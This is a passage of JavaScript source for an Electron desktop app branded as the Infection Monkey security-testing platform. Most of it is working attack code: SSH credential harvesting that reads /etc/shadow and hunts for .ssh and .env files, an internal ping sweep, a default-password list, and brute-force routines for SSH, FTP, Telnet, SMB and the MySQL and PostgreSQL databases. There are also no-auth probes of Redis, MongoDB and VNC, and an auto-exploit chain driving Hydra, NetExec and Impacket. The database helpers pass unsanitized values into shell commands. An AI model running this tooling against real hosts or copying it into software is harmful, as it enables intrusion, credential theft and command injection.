        sshExec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -30', (out, ok) => {
            if (ok) {
                results.systemInfo.services = out.substring(0, 500);
                const ports = out.match(/:(\d+)\s/g) || [];
                results.services = [...new Set(ports.map(p => parseInt(p.replace(':', ''))))].filter(p => p > 0 && p < 65536);
            }
            done();
        });
    } else { done(); }

    // 6. Credential Harvesting (config files, history)
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('find /home -name ".bash_history" -o -name ".ssh" -o -name "*.conf" -o -name ".env" 2>/dev/null | head -20; cat /etc/shadow 2>/dev/null | head -5', (out, ok) => {
            if (ok) results.systemInfo.sensitiveFiles = out.substring(0, 500);
            done();
        });
    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
        smbExec('enumprinters', (out, ok) => {
            if (ok) results.systemInfo.sensitiveFiles = out.substring(0, 500);
            done();
        });
    } else { done(); }

    // 7. Scan discovered neighbors from inside
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('for i in $(seq 1 254); do (ping -c1 -W1 $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i 2>/dev/null | grep "bytes from" &); done 2>/dev/null | head -20; wait', (out, ok) => {
            if (ok && out) {
                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
                const newHosts = [...new Set(ips)].filter(ip => ip !== host && !results.discoveredHosts.includes(ip));
                results.discoveredHosts = [...results.discoveredHosts, ...newHosts];
            }
            done();
        });
    } else { done(); }
}

// Built-in network password testing (no external tools needed)
function testCredentials(host, port, service, username, password, callback) {
    const timeout = 8000;

    if (service === 'ssh' && port === 22) {
        attemptSSHExploit(host, username, password, callback);
    } else if (service === 'ftp' && port === 21) {
        attemptFTPExploit(host, username, password, callback);
    } else if (service === 'smb' && (port === 445 || port === 139)) {
        attemptSMBExploit(host, username, password, callback);
    } else if (service === 'telnet' && port === 23) {
        attemptTelnetExploit(host, username, password, callback);
    } else if (service === 'mysql' && port === 3306) {
        attemptMySQLExploit(host, username, password, callback);
    } else if (service === 'postgresql' && port === 5432) {
        attemptPostgresExploit(host, username, password, callback);
    } else {
        // Generic TCP credential test via banner
        const socket = new net.Socket();
        socket.setTimeout(timeout);
        let response = '';

        socket.on('data', (data) => { response += data.toString(); });
        socket.on('connect', () => {
            setTimeout(() => {
                socket.write(`${username}\r\n`);
                setTimeout(() => {
                    socket.write(`${password}\r\n`);
                    setTimeout(() => {
                        socket.destroy();
                        const lower = response.toLowerCase();
                        const success = lower.includes('welcome') || lower.includes('ok') || lower.includes('logged') || lower.includes('success');
                        callback({ success, method: `TCP-${service}`, host, username, port, info: success ? 'Login successful' : 'Login failed' });
                    }, 1500);
                }, 1000);
            }, 500);
        });
        socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: `TCP-${service}`, host, error: 'Timeout' }); });
        socket.on('error', (err) => { callback({ success: false, method: `TCP-${service}`, host, error: err.message }); });
        socket.connect(port, host);
    }
}

// Batch password testing against a host/service
function batchTestCredentials(host, port, service, credentials, callback) {
    const results = [];
    let index = 0;
    let found = false;

    function next() {
        if (index >= credentials.length || found) {
            const best = results.find(r => r.success);
            callback({
                success: !!best,
                method: best ? best.method : `${service}-brute`,
                host, port, service,
                username: best ? best.username : null,
                password: best ? best.password : null,
                allResults: results,
                attempts: results.length,
                info: best ? `Login successful: ${best.username}` : `All ${results.length} attempts failed`
            });
            return;
        }

        const cred = credentials[index++];
        testCredentials(host, port, service, cred.username, cred.password, (r) => {
            r.password = cred.password;
            results.push(r);
            if (r.success) found = true;
            next();
        });
    }

    next();
}

// ===== ENHANCED AUTO-EXPLOIT WITH ALL INTEGRATED TOOLS =====
function detectInstalledTools(callback) {
    const tools = ['nxc', 'netexec', 'crackmapexec', 'nmap', 'hydra',
        'impacket-psexec', 'impacket-smbexec', 'impacket-wmiexec',
        'impacket-secretsdump', 'psexec.py', 'smbexec.py', 'wmiexec.py'];

    let pending = tools.length;
    const available = {};

    tools.forEach(tool => {
        checkTool(tool, (path2) => {
            if (path2) available[tool] = path2;
            pending--;
            if (pending <= 0) callback(available);
        });
    });
}

// ===== DEFAULT CREDENTIAL DICTIONARY =====
const DEFAULT_CREDENTIALS = [
    { username: 'root', password: 'root' },
    { username: 'root', password: 'toor' },
    { username: 'root', password: '' },
    { username: 'root', password: 'password' },
    { username: 'root', password: '123456' },
    { username: 'root', password: 'admin' },
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'admin', password: '123456' },
    { username: 'admin', password: '' },
    { username: 'admin', password: 'admin123' },
    { username: 'user', password: 'user' },
    { username: 'user', password: 'password' },
    { username: 'test', password: 'test' },
    { username: 'guest', password: 'guest' },
    { username: 'pi', password: 'raspberry' },
    { username: 'ubuntu', password: 'ubuntu' },
    { username: 'postgres', password: 'postgres' },
    { username: 'mysql', password: 'mysql' },
    { username: 'oracle', password: 'oracle' },
    { username: 'sa', password: '' },
    { username: 'sa', password: 'sa' },
    { username: 'administrator', password: 'administrator' },
    { username: 'administrator', password: 'password' },
    { username: 'administrator', password: '' }
];

// FTP exploitation: anonymous + credential brute-force
function attemptFTPExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(8000);
    let response = '';
    let phase = 'connect';

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response += data.toString();

        if (phase === 'connect' && response.includes('220')) {
            phase = 'user';
            socket.write(`USER ${username}\r\n`);
        } else if (phase === 'user' && (response.includes('331') || response.includes('230'))) {
            if (response.includes('230')) {
                socket.destroy();
                callback({ success: true, method: 'FTP', host, username, info: 'FTP login without password' });
                return;
            }
            phase = 'pass';
            socket.write(`PASS ${password}\r\n`);
        } else if (phase === 'pass') {
            socket.destroy();
            if (response.includes('230')) {
                callback({ success: true, method: 'FTP', host, username, info: 'FTP credentials valid' });
            } else {
                callback({ success: false, method: 'FTP', error: 'FTP login failed' });
            }
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'FTP', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'FTP', error: err.message }); });
    socket.connect(21, host);
}

// Telnet exploitation
function attemptTelnetExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(10000);
    let response = '';
    let sentUser = false;
    let sentPass = false;

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response += data.toString();
        const lower = response.toLowerCase();

        if (!sentUser && (lower.includes('login:') || lower.includes('username:'))) {
            sentUser = true;
            socket.write(username + '\r\n');
        } else if (sentUser && !sentPass && (lower.includes('password:') || lower.includes('pass:'))) {
            sentPass = true;
            socket.write(password + '\r\n');
        } else if (sentPass) {
            setTimeout(() => {
                socket.destroy();
                const success = !lower.includes('incorrect') && !lower.includes('failed') &&
                    !lower.includes('denied') && !lower.includes('invalid') &&
                    (lower.includes('$') || lower.includes('#') || lower.includes('>') || lower.includes('welcome') || lower.includes('last login'));
                callback({ success, method: 'Telnet', host, username, info: success ? 'Telnet access gained' : 'Telnet login failed' });
            }, 2000);
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Telnet', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'Telnet', error: err.message }); });
    socket.connect(23, host);
}

// Redis no-auth exploitation
function attemptRedisExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = '';

    socket.on('connect', () => {
        socket.write('PING\r\n');
    });

    socket.on('data', (data) => {
        response += data.toString();
        if (response.includes('+PONG')) {
            // Redis responds without auth - try to get info
            socket.write('INFO server\r\n');
            setTimeout(() => {
                socket.destroy();
                callback({
                    success: true, method: 'Redis-NoAuth', host,
                    info: 'Redis accessible without authentication',
                    version: (response.match(/redis_version:(\S+)/) || [null, 'unknown'])[1],
                    sysInfo: response.substring(0, 500)
                });
            }, 1000);
        } else if (response.includes('-NOAUTH') || response.includes('-ERR')) {
            socket.destroy();
            callback({ success: false, method: 'Redis', error: 'Redis requires authentication' });
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Redis', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'Redis', error: err.message }); });
    socket.connect(6379, host);
}

// MongoDB no-auth exploitation
function attemptMongoExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);

    socket.on('connect', () => {
        // MongoDB wire protocol: send isMaster command
        // Simplified: just check if port accepts connection and responds
        const isWin = process.platform === 'win32';
        socket.destroy();

        // Try mongosh/mongo CLI
        const mongoCmd = isWin ? 'mongosh' : 'mongosh';
        exec(`which ${mongoCmd} 2>/dev/null || which mongo 2>/dev/null`, { timeout: 2000 }, (err, which) => {
            if (!err && which.trim()) {
                const cmd = which.trim();
                exec(`${cmd} --host ${host} --eval "db.adminCommand('listDatabases')" --quiet 2>&1`, { timeout: 10000 }, (error, stdout) => {
                    const success = stdout && (stdout.includes('databases') || stdout.includes('name'));
                    callback({
                        success, method: 'MongoDB-NoAuth', host,
                        info: success ? 'MongoDB accessible without auth' : 'MongoDB requires auth',
                        sysInfo: success ? stdout.substring(0, 500) : null
                    });
                });
            } else {
                // No mongo client - just report port is open
                callback({ success: false, method: 'MongoDB', host, info: 'MongoDB port open, install mongosh for exploitation', portOpen: true });
            }
        });
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MongoDB', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'MongoDB', error: err.message }); });
    socket.connect(27017, host);
}

// MySQL exploitation
function attemptMySQLExploit(host, username, password, callback) {
    const isWin = process.platform === 'win32';
    exec(`which mysql 2>/dev/null`, { timeout: 2000 }, (err) => {
        if (!err) {
            const passFlag = password ? `-p'${password.replace(/'/g, "\\'")}'` : '';
            exec(`mysql -h ${host} -u ${username} ${passFlag} -e "SELECT version();" 2>&1`, { timeout: 10000 }, (error, stdout) => {
                const success = stdout && (stdout.includes('version') || stdout.match(/\d+\.\d+\.\d+/));
                callback({
                    success, method: 'MySQL', host, username,
                    info: success ? `MySQL access: ${stdout.trim().split('\n').pop()}` : 'MySQL auth failed',
                    sysInfo: success ? stdout : null
                });
            });
        } else {
            // Try raw TCP handshake
            const socket = new net.Socket();
            socket.setTimeout(5000);
            socket.on('connect', () => {
                socket.on('data', (data) => {
                    socket.destroy();
                    const banner = data.toString('utf8', 0, Math.min(data.length, 100));
                    callback({ success: false, method: 'MySQL', host, info: 'MySQL port open, install mysql client for exploitation', banner });
                });
            });
            socket.on('error', (e) => { callback({ success: false, method: 'MySQL', error: e.message }); });
            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MySQL', error: 'Timeout' }); });
            socket.connect(3306, host);
        }
    });
}

// PostgreSQL exploitation
function attemptPostgresExploit(host, username, password, callback) {
    exec(`which psql 2>/dev/null`, { timeout: 2000 }, (err) => {
        if (!err) {
            const env = password ? `PGPASSWORD='${password.replace(/'/g, "\\'")}'` : '';
            exec(`${env} psql -h ${host} -U ${username} -c "SELECT version();" -t 2>&1`, { timeout: 10000 }, (error, stdout) => {
                const success = stdout && (stdout.includes('PostgreSQL') || stdout.match(/\d+\.\d+/));
                callback({
                    success, method: 'PostgreSQL', host, username,
                    info: success ? `PostgreSQL access: ${stdout.trim()}` : 'PostgreSQL auth failed',
                    sysInfo: success ? stdout : null
                });
            });
        } else {
            const socket = new net.Socket();
            socket.setTimeout(5000);
            socket.on('connect', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', host, info: 'PostgreSQL port open, install psql for exploitation' }); });
            socket.on('error', (e) => { callback({ success: false, method: 'PostgreSQL', error: e.message }); });
            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'PostgreSQL', error: 'Timeout' }); });
            socket.connect(5432, host);
        }
    });
}

// VNC no-auth check
function attemptVNCExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = Buffer.alloc(0);

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response = Buffer.concat([response, data]);
        const str = response.toString();

        if (str.startsWith('RFB')) {
            // VNC handshake - respond with same version
            const version = str.substring(0, 12);
            socket.write(version);

            setTimeout(() => {
                // Check security type
                if (response.length > 12) {
                    const secTypes = response.slice(12);
                    // Security type 1 = None (no auth)
                    if (secTypes.includes(1)) {
                        socket.destroy();
                        callback({ success: true, method: 'VNC-NoAuth', host, info: `VNC no authentication required (${version.trim()})` });
                        return;
                    }
                }
                socket.destroy();
                callback({ success: false, method: 'VNC', host, info: `VNC requires auth (${version.trim()})` });
            }, 1500);
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'VNC', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'VNC', error: err.message }); });
    socket.connect(5900, host);
}

// ===== AUTO-EXPLOIT: Tries everything against a host =====
// Phase 1: Nmap vuln scan (if available)
// Phase 2: NetExec multi-protocol (if available)
// Phase 3: Impacket tools (if available, for Windows targets)
// Phase 4: Hydra brute-force (if available)
// Phase 5: Built-in TCP exploits (always available as fallback)
function autoExploit(host, openPorts, userCredentials, callback) {
    const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
    const allCreds = [...userCredentials, ...DEFAULT_CREDENTIALS];
    const results = [];
    let bestResult = null;

    // Deduplicate credentials
    const uniqueCreds = [];
    const seen = new Set();
    for (const c of allCreds) {
        const key = `${c.username}:${c.password}`;
        if (!seen.has(key)) {
            seen.add(key);
            uniqueCreds.push(c);
            if (uniqueCreds.length >= 20) break;
        }
    }

    // Detect available tools first
    detectInstalledTools((tools) => {
        const hasNxc = tools['nxc'] || tools['netexec'] || tools['crackmapexec'];
        const hasImpacket = tools['impacket-psexec'] || tools['impacket-smbexec'] || tools['psexec.py'];
        const hasNmap = tools['nmap'];
        const hasHydra = tools['hydra'];

        let phasesComplete = 0;
        const totalPhases = 5;

        function phaseComplete(phaseName) {
            phasesComplete++;
            // Check if we already have a success
            if (bestResult) {
                finishExploit();
                return;
            }
            if (phasesComplete >= totalPhases) {
                finishExploit();
            }
        }

        let finished = false;
        function finishExploit() {
            if (finished) return;
            finished = true;
            const success = results.find(r => r.success);
            if (success && !bestResult) bestResult = success;

            // Map all results to ATT&CK techniques
            const attackMapping = bestResult ? mapExploitToATTACK(bestResult.method) : { tactics: [], techniques: [] };
            const allTechniques = results.map(r => ({
                method: r.method,
                success: r.success,
                attack: mapExploitToATTACK(r.method || '')
            }));

            // Always include scanning technique
            attackMapping.techniques.push('T1046'); // Network Service Discovery
            attackMapping.techniques.push('T1595.002'); // Vulnerability Scanning

            callback({
                success: !!bestResult,
                method: bestResult ? bestResult.method : 'None',
                host,
                bestResult: bestResult || null,
                allResults: results,
                toolsUsed: Object.keys(tools),
                attackMapping,
                allTechniques,
                info: bestResult ?
                    `Exploited via ${bestResult.method} (${bestResult.username || 'no-auth'})${bestResult.admin ? ' [ADMIN]' : ''}` :
                    `All ${results.length} exploitation attempts failed`,
                username: bestResult ? bestResult.username : null,
                admin: bestResult ? bestResult.admin : false,
                sysInfo: bestResult ? bestResult.sysInfo : null
            });
        }

        // Phase 1: Nmap vulnerability scan
        if (hasNmap && openPorts.length > 0) {
            nmapVulnScan(host, openPorts, (nmapResult) => {
                if (nmapResult.vulns && nmapResult.vulns.length > 0) {
                    results.push({ ...nmapResult, method: 'Nmap-VulnScan' });
                }
                phaseComplete('nmap');
            });
        } else {
            phaseComplete('nmap');
        }

        // Phase 2: NetExec multi-protocol exploitation
        if (hasNxc) {
            nxcFullExploit(host, openPorts, uniqueCreds.slice(0, 8), (nxcResult) => {
                results.push(nxcResult);
                if (nxcResult.success && !bestResult) bestResult = nxcResult;
                phaseComplete('netexec');
            });
        } else {
            phaseComplete('netexec');
        }

        // Phase 3: Impacket tools (Windows targets - SMB ports)
        if (hasImpacket && (portSet.has(445) || portSet.has(139))) {
            impacketFullExploit(host, uniqueCreds.slice(0, 5), (impResult) => {
                results.push(impResult);
                if (impResult.success && !bestResult) bestResult = impResult;
                phaseComplete('impacket');
            });
        } else {
            phaseComplete('impacket');
        }

        // Phase 4: Hydra brute-force
        if (hasHydra) {
            const hydraTargets = [];
            if (portSet.has(22)) hydraTargets.push({ port: 22, service: 'ssh' });
            if (portSet.has(21)) hydraTargets.push({ port: 21, service: 'ftp' });
            if (portSet.has(445)) hydraTargets.push({ port: 445, service: 'smb' });
            if (portSet.has(3306)) hydraTargets.push({ port: 3306, service: 'mysql' });
            if (portSet.has(5432)) hydraTargets.push({ port: 5432, service: 'postgres' });
            if (portSet.has(3389)) hydraTargets.push({ port: 3389, service: 'rdp' });

            if (hydraTargets.length > 0) {
                let hydraDone = 0;
                hydraTargets.forEach(target => {
                    hydraBrute(host, target.port, target.service, uniqueCreds, (hydraResult) => {
                        results.push(hydraResult);
                        if (hydraResult.success && !bestResult) bestResult = hydraResult;
                        hydraDone++;
                        if (hydraDone >= hydraTargets.length) phaseComplete('hydra');
                    });
                });
            } else {
                phaseComplete('hydra');
            }
        } else {
            phaseComplete('hydra');
        }

        // Phase 5: Built-in TCP exploits (always available)
        let builtinPending = 0;
        let builtinDone = 0;

        function builtinCheck() {
            builtinDone++;
            if (builtinDone >= builtinPending) phaseComplete('builtin');
        }

        // No-auth exploits
        if (portSet.has(6379)) { builtinPending++; attemptRedisExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
        if (portSet.has(27017)) { builtinPending++; attemptMongoExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
        if (portSet.has(5900)) { builtinPending++; attemptVNCExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
        if (portSet.has(21)) { builtinPending++; attemptFTPExploit(host, 'anonymous', 'anonymous@', (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }

        // Credential-based built-in exploits
        for (const cred of uniqueCreds.slice(0, 8)) {
            if (portSet.has(22)) { builtinPending++; attemptSSHExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
            if (portSet.has(445)) { builtinPending++; attemptSMBExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
            if (portSet.has(21)) { builtinPending++; attemptFTPExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
            if (portSet.has(23)) { builtinPending++; attemptTelnetExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
            if (portSet.has(3306)) { builtinPending++; attemptMySQLExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
            if (portSet.has(5432)) { builtinPending++; attemptPostgresExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
        }

        if (builtinPending === 0) phaseComplete('builtin');
    });
}

// No separate Next.js server needed - static files served by the combined app server

function createWindow(port) {
    const apiPort = port; // API and static files served on same port

    mainWindow = new BrowserWindow({
        width: 1400,
        height: 900,
        minWidth: 1024,
        minHeight: 700,
        title: 'Infection Monkey - Security Testing Platform',
        icon: path.join(__dirname, 'icon.png'),
        backgroundColor: '#0A0E17',
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        },
        autoHideMenuBar: false,
        show: false
    });

    const menuTemplate = [
        {
            label: 'File',
            submenu: [
                {
                    label: 'New Simulation',
                    accelerator: 'CmdOrCtrl+N',
                    click: () => mainWindow.webContents.executeJavaScript("window.location.href = '/run'")
                },
                { type: 'separator' },
                {
                    label: 'Export Configuration',
                    accelerator: 'CmdOrCtrl+E',
                    click: () => exportConfiguration()
                },
                {
                    label: 'Import Configuration',
                    accelerator: 'CmdOrCtrl+I',
                    click: () => importConfiguration()
                },
                { type: 'separator' },
                { role: 'quit' }
            ]
        },
        {
            label: 'View',
            submenu: [
                { label: 'Dashboard', accelerator: 'CmdOrCtrl+1', click: () => navigateTo('/dashboard') },
                { label: 'Configure', accelerator: 'CmdOrCtrl+2', click: () => navigateTo('/configure') },
                { label: 'Run Simulation', accelerator: 'CmdOrCtrl+3', click: () => navigateTo('/run') },
                { label: 'Network Map', accelerator: 'CmdOrCtrl+4', click: () => navigateTo('/network-map') },
                { label: 'Reports', accelerator: 'CmdOrCtrl+5', click: () => navigateTo('/report') },
                { type: 'separator' },
                { role: 'reload' },
                { role: 'forceReload' },
                { role: 'toggleDevTools' },
                { type: 'separator' },
                { role: 'zoomIn' },
                { role: 'zoomOut' },
                { role: 'resetZoom' },
                { type: 'separator' },
                { role: 'togglefullscreen' }
            ]
        },
        {
            label: 'Simulation',
            submenu: [
                { label: 'Start Simulation', accelerator: 'F5', click: () => navigateTo('/run') },
                { label: 'View Events', click: () => navigateTo('/events') },
                { type: 'separator' },
                { label: 'Plugins', click: () => navigateTo('/plugins/available') }
            ]
        },
        {
            label: 'Help',
            submenu: [
                { label: 'Documentation', click: () => shell.openExternal('https://techdocs.akamai.com/infection-monkey/docs/') },
                { label: 'GitHub Repository', click: () => shell.openExternal('https://github.com/guardicore/monkey') },
                { type: 'separator' },
                { label: 'About Infection Monkey', click: () => navigateTo('/about') }
            ]
        }
    ];

    function navigateTo(p) {
        mainWindow.webContents.executeJavaScript(`window.location.href = '${p}'`);
    }

    Menu.setApplicationMenu(Menu.buildFromTemplate(menuTemplate));

    // Inject desktop app configuration on page load
    mainWindow.webContents.on('did-finish-load', () => {
        mainWindow.webContents.executeJavaScript(`
            window.__MONKEY_DESKTOP__ = true;
            window.__MONKEY_API_PORT__ = ${apiPort};
        `).catch(() => {});
    });

    // Retry loading URL until the server is ready
    const loadWithRetry = (url, retries = 10) => {
        mainWindow.loadURL(url).catch((err) => {
            console.error(`Failed to load ${url}:`, err.message);
            if (retries > 0) {
                setTimeout(() => loadWithRetry(url, retries - 1), 2000);
            } else {
                // After all retries, show error page
                mainWindow.loadURL(`data:text/html,<html><body style="background:#0A0E17;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center"><h1>Startup Error</h1><p>Could not connect to internal server.</p><p>Please restart the application.</p></div></body></html>`);
            }
        });
    };

    loadWithRetry(`http://127.0.0.1:${port}`);

    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
    });

    mainWindow.on('closed', () => {
        mainWindow = null;
    });
}

async function exportConfiguration() {
    const result = await dialog.showSaveDialog(mainWindow, {
        title: 'Export Configuration',
        defaultPath: 'monkey-config.json',
        filters: [{ name: 'JSON Files', extensions: ['json'] }]
    });
    if (!result.canceled) {
        mainWindow.webContents.executeJavaScript(`
            (function() {
                const keys = ['monkey_config', 'monkey_simulation', 'monkey_events', 'monkey_settings'];
                const data = {};
                keys.forEach(k => {
                    try { data[k] = JSON.parse(localStorage.getItem(k)); } catch(e) {}
                });
                return JSON.stringify(data, null, 2);
            })()
        `).then(json => {
            fs.writeFileSync(result.filePath, json);
        }).catch(() => {});
    }
}

async function importConfiguration() {
    const result = await dialog.showOpenDialog(mainWindow, {
        title: 'Import Configuration',
        filters: [{ name: 'JSON Files', extensions: ['json'] }],
        properties: ['openFile']
    });
    if (!result.canceled && result.filePaths.length > 0) {
        try {
            const content = fs.readFileSync(result.filePaths[0], 'utf8');
            const data = JSON.parse(content);
            mainWindow.webContents.executeJavaScript(`
                (function() {
                    const data = ${JSON.stringify(data)};
                    Object.entries(data).forEach(([k, v]) => {
                        if (v) localStorage.setItem(k, JSON.stringify(v));
                    });
                    window.location.reload();
                })()
            `);
        } catch (e) {
            dialog.showErrorBox('Import Error', 'Failed to import configuration file.');
        }
    }
}

function createSplashWindow() {
    const splash = new BrowserWindow({
        width: 500,
        height: 350,
        frame: false,
        transparent: true,
        resizable: false,
        center: true,
        webPreferences: { nodeIntegration: false, contextIsolation: true }
    });

    splash.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(`
<!DOCTYPE html>
<html>
<head>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: 'Segoe UI', -apple-system, sans-serif;
        background: #0A0E17;
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        border-radius: 16px;
        border: 1px solid rgba(255,255,255,0.1);
        overflow: hidden;
    }
    .logo {
        font-size: 36px;
        font-weight: 800;
        background: linear-gradient(135deg, #00E676, #7C4DFF);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 8px;
    }
    .subtitle { color: rgba(255,255,255,0.6); font-size: 14px; margin-bottom: 40px; }
    .loader { width: 200px; height: 3px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 16px; }
    .loader-bar { height: 100%; width: 40%; background: linear-gradient(90deg, #00E676, #7C4DFF); border-radius: 3px; animation: loading 1.5s ease-in-out infinite; }
    @keyframes loading { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
    .status { color: rgba(255,255,255,0.4); font-size: 12px; }
    .version { position: absolute; bottom: 16px; color: rgba(255,255,255,0.3); font-size: 11px; }
</style>
</head>
<body>
    <div style="font-size:48px;margin-bottom:16px;">&#x1F412;</div>
    <div class="logo">Infection Monkey</div>
    <div class="subtitle">Security Testing Platform</div>
    <div class="loader"><div class="loader-bar"></div></div>
    <div class="status">Starting application...</div>
    <div class="version">v2.3.0</div>
</body>
</html>
    `)}`);

    return splash;
}

// IPC handlers
ipcMain.handle('get-network-info', () => getNetworkInfo());
ipcMain.handle('get-system-info', () => ({
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    uptime: os.uptime()
}));

app.whenReady().then(async () => {
    const splash = createSplashWindow();

    try {
        // Find an available port for the combined server (API + static files)
        const appPort = await findAvailablePort(17812);
        console.log(`Using port: ${appPort}`);
        console.log(`Static dir: ${getStaticDir()}`);
        console.log(`Static dir exists: ${fs.existsSync(getStaticDir())}`);

        // Start the combined server (serves both API and static files)
        const appServer = createAppServer();
        await new Promise((resolve, reject) => {
            appServer.on('error', (err) => {
                console.error('Server error:', err);
                reject(err);
            });
            appServer.listen(appPort, '127.0.0.1', () => {
                console.log(`App server running on port ${appPort}`);
                resolve();
            });
        });
        global.apiServer = appServer;

        createWindow(appPort);
        splash.close();
    } catch (err) {
        console.error('Failed to start:', err);
        splash.close();
        dialog.showErrorBox(
            'Startup Error',
            `Failed to start Infection Monkey.\n\nError: ${err.message}\n\nPlease try restarting the application.`
        );
        app.quit();
    }
});

app.on('window-all-closed', () => {
    if (global.apiServer) global.apiServer.close();
    app.quit();
});

app.on('before-quit', () => {
    if (global.apiServer) global.apiServer.close();
});
